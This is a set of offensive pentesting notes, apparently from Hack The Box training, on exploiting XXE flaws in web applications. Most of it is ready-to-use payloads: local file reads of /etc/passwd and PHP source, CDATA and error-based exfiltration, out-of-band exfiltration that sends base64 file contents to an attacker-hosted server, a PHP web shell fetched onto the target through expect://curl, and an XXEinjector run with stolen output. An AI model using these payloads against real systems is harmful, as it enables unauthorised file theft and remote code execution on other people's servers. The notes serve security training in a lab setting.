# Exploiting XXE

### Local File Disclosure&#x20;

This can be achieved when the web application accepts unfiltered XML input from a user. The user could potentially reference an external DTD document and define malicious XML entities. We can make these reference a local file, which would be displayed on screen when it is referenced if the XML data is used to display data on screen.

#### Identify/Detect:&#x20;

1. Look for web pages that accept XML input, by intercepting requests with burp suite.&#x20;
2. Check to see if content from the XML input is being displayed on screen anywhere. Note which XML element is being displayed, so we can know which element to inject in to.&#x20;
3. Attempt to define a new entity and then use as a variable in the email element, to see if it gets replaced with the defined value.&#x20;
   1. ```
      <!DOCTYPE email [
        <!ENTITY company "Inlane Freight">
      ]>
      ```
4. Attempt to use the newly defined variable in the input and see if it is displayed on screen.
   1.

       <figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
5. This would confirm that the application is vulnerable.&#x20;
6. Then we can test for file disclosure:&#x20;
   1.  ```
       <!DOCTYPE email [
         <!ENTITY company SYSTEM "file:///etc/passwd">
       ]>
       ```


   2.

       <figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

### Reading Source Code

If possible, we should always attempt to gain access to the source code as this can allow us to discover more vulnerabilities in the application.

_**Important Note:**_ XML special characters in the file break the external entity reference, so if the file contains of of these: (<, >, &) we might need to use wrappers to access them. PHP has wrappers that will allow us to base64 encode the output, getting around the limitation.&#x20;

```
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```



### Remote Code Execution w/ XXE

You may be able to find an SSH key, or use a hash-stealing method on a windows server by making a call to our web server and catching the response with responder or smb server. If the application is running off of PHP, we may be able to execute command through PHP filters.&#x20;

Host a web shell on your attack box:&#x20;

```
Adam-162@htb[/htb]$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
Adam-162@htb[/htb]$ sudo python3 -m http.server 80
```

Then call it:&#x20;

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

<sup>Note: We replaced all spaces in the above XML code with</sup> <sup></sup><sup>`$IFS`</sup><sup>, to avoid breaking the XML syntax. Furthermore, many other characters like</sup> <sup></sup><sup>`|`</sup><sup>,</sup> <sup></sup><sup>`>`</sup><sup>, and</sup> <sup></sup><sup>`{`</sup> <sup></sup><sup>may break the code, so we should avoid using them.</sup>

In modern versions of PHP, the expect module is not installed or enabled by default.&#x20;

### SSRF via XXE

SSRF (Server Side Request Forgery) can be used to enumerate local ports, access thier pages, access restricted web pages, etc.&#x20;

### Data exfiltration with CDATA

This method can be used for any web application architecture, not just PHP. we wrap the external file reference in the CDATA tag, which the XML parser considers raw data.&#x20;

```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```

This would not work out of the gate because we are mixing internal and external references per XML specifications. we can bypass this limitation using XML parameter entities. when this is used from an external source (i.e your attack box) it considers them all an external source and can be joined.&#x20;

```
Adam-162@htb[/htb]$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
Adam-162@htb[/htb]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```

This can come in handy when basic XXE doesnt work or with different web applicaiton frameworks.&#x20;

### Error Based XXE (blind)

This method is helpful when the web app does not write any output to the webpage, but the web application does display runtime errors on the page. We can send a malformed XML request and check for returned errors. we can reference a non existent entity or put a typo into the XML tags:

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Similar to the CDATA exfiltration, we host a DTD with our payload. the payload is joining the nonExistingEntity with the target file, which would be merged and shown on the error page.&#x20;

DTD Payload, hosted on the attack box:

```
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

Payload in the request to server:&#x20;

```
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

### Out-Of-Band Data Exfiltration (blind)

In this instance, no error is displayed and the output of the XML is not displayed on screen. So we will instead trick the server into sending our attack box a web request with the content of the file.

We are going to host a DTD payload on our own server:&#x20;

```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

and then send our request payload to the server:&#x20;

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

Which should have sent us the base64 encoded string in the request URL.&#x20;

We can automatically grab and decode and output to console by doing the following:&#x20;

write to index.php:

```
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

```shell-session
Adam-162@htb[/htb]$ vi index.php # here we write the above PHP code
Adam-162@htb[/htb]$ php -S 0.0.0.0:8000

PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
```

### Automated OOB Exfiltration

{% embed url="https://github.com/enjoiz/XXEinjector" %}

Copy a request to the server that is sending HTML and save it to a file with only the first line and XXEINJECT:

```
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

Now, we can run the tool with the `--host`/`--httpport` flags being our IP and port, the `--file` flag being the file we wrote above, and the `--path` flag being the file we want to read. We will also select the `--oob=http` and `--phpfilter` flags to repeat the OOB attack we did above, as follows:

&#x20; Blind Data Exfiltration

```shell-session
Adam-162@htb[/htb]$ ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter

...SNIP...
[+] Sending request with malicious XML.
[+] Responding with XML for: /etc/passwd
[+] Retrieved data:
```

The output can be accessed in the log files:

```shell-session
Adam-162@htb[/htb]$ cat Logs/10.129.201.94/etc/passwd.log 

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...SNIP..
```
